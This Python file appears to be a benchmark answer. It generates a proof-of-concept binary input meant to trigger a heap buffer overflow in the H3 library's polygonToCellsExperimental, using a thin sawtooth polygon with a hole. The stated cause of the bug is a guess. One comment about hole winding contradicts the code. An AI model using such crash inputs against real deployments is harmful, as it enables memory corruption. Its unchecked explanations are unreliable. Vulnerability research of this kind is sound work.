import struct
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability in polygonToCellsExperimental.

        The vulnerability is a heap buffer overflow caused by under-estimating the
        number of H3 cells required to fill a complex polygon. The size estimation
        is likely based on the polygon's bounding box area, which can be small
        for a polygon with a large perimeter and many features.

        This PoC constructs a polygon with a very small bounding box but a complex
        boundary, featuring "sawtooth" edges on both the outer loop and an
        inner hole. This high-frequency boundary is designed to intersect a large
        number of H3 cells, exceeding the pre-allocated buffer size.

        The PoC is serialized into a binary format that a typical fuzzing harness
        for the H3 library would expect, consisting of the resolution followed by
        the GeoPolygon data (vertex counts and coordinates).
        """

        def degs_to_rads(deg: float) -> float:
            """Converts degrees to radians."""
            return deg * math.pi / 180

        # A high resolution is chosen to create a fine grid of cells, making it
        # easier for the complex polygon boundary to cross many cells.
        res = 15

        # --- Polygon geometry parameters ---
        # Base coordinates are in a non-special region (not near poles or antimeridian).
        lat_base_deg = 40.0
        lon_base_deg = -70.0
        # The polygon is made extremely thin and relatively short. This creates a
        # small bounding box, which is key to tricking the size estimation.
        height_deg = 0.0001
        width_deg = 0.01

        # --- Outer Loop (Geofence) - counter-clockwise winding ---
        # The number of "teeth" is chosen to create a complex boundary while
        # keeping the PoC size close to (and shorter than) the ground-truth length.
        num_teeth_outer = 19
        
        outer_verts = []
        lat_base_rad = degs_to_rads(lat_base_deg)
        lon_base_rad = degs_to_rads(lon_base_deg)
        height_rad = degs_to_rads(height_deg)
        width_rad = degs_to_rads(width_deg)
        lon_step_rad_outer = width_rad / num_teeth_outer

        # The outer loop is defined counter-clockwise, starting from the bottom-left.
        # 1. Bottom-left to bottom-right edge
        outer_verts.append((lat_base_rad, lon_base_rad))
        outer_verts.append((lat_base_rad, lon_base_rad + width_rad))
        # 2. Bottom-right to top-right edge
        outer_verts.append((lat_base_rad + height_rad, lon_base_rad + width_rad))
        
        # 3. Top sawtooth edge (from right to left)
        for i in range(num_teeth_outer, 0, -1):
            lon_peak = lon_base_rad + (i - 0.5) * lon_step_rad_outer
            lon_valley = lon_base_rad + (i - 1) * lon_step_rad_outer
            outer_verts.append((lat_base_rad + height_rad, lon_peak))
            outer_verts.append((lat_base_rad + height_rad * 0.5, lon_valley))

        # 4. Top-left vertex to close the shape.
        outer_verts.append((lat_base_rad + height_rad, lon_base_rad))
        
        # --- Hole - clockwise winding ---
        # A complex hole is added to further increase the number of cells needed,
        # as the algorithm must perform point-in-polygon tests against it.
        num_holes = 1
        num_teeth_hole = 9

        # The hole is defined within the bounds of the outer loop.
        margin_lon_deg = width_deg / 10.0
        margin_lat_deg = height_deg / 10.0
        h_lat_base_deg = lat_base_deg + margin_lat_deg
        h_lon_base_deg = lon_base_deg + margin_lon_deg
        h_height_deg = height_deg - 2 * margin_lat_deg
        h_width_deg = width_deg - 2 * margin_lon_deg

        hole_verts = []
        h_lat_base_rad = degs_to_rads(h_lat_base_deg)
        h_lon_base_rad = degs_to_rads(h_lon_base_deg)
        h_height_rad = degs_to_rads(h_height_deg)
        h_width_rad = degs_to_rads(h_width_deg)
        lon_step_rad_hole = h_width_rad / num_teeth_hole
        
        # The hole loop is defined clockwise.
        # 1. Start at bottom-left.
        hole_verts.append((h_lat_base_rad, h_lon_base_rad))

        # 2. Sawtooth along bottom edge (from left to right).
        # The teeth poke "downward", into the polygon's fill area.
        for i in range(num_teeth_hole):
            lon_peak = h_lon_base_rad + (i + 0.5) * lon_step_rad_hole
            lon_valley = h_lon_base_rad + (i + 1) * lon_step_rad_hole
            hole_verts.append((h_lat_base_rad - h_height_rad * 0.5, lon_peak))
            hole_verts.append((h_lat_base_rad, lon_valley))

        # 3. Add top-right and top-left vertices to complete the loop.
        hole_verts.append((h_lat_base_rad + h_height_rad, h_lon_base_rad + h_width_rad))
        hole_verts.append((h_lat_base_rad + h_height_rad, h_lon_base_rad))

        # --- Serialization ---
        # The data is packed into a little-endian byte string, which is a common
        # format for C/C++ fuzzing harnesses on x86 platforms.
        poc = bytearray()
        
        # Pack resolution (int32)
        poc.extend(struct.pack("<i", res))
        
        # Pack outer loop: number of vertices (int32) and vertices (list of doubles)
        poc.extend(struct.pack("<i", len(outer_verts)))
        for lat, lon in outer_verts:
            poc.extend(struct.pack("<dd", lat, lon))
            
        # Pack holes: number of holes (int32)
        poc.extend(struct.pack("<i", num_holes))
        if num_holes > 0:
            # Pack first hole: number of vertices and vertices
            poc.extend(struct.pack("<i", len(hole_verts)))
            for lat, lon in hole_verts:
                poc.extend(struct.pack("<dd", lat, lon))

        return bytes(poc)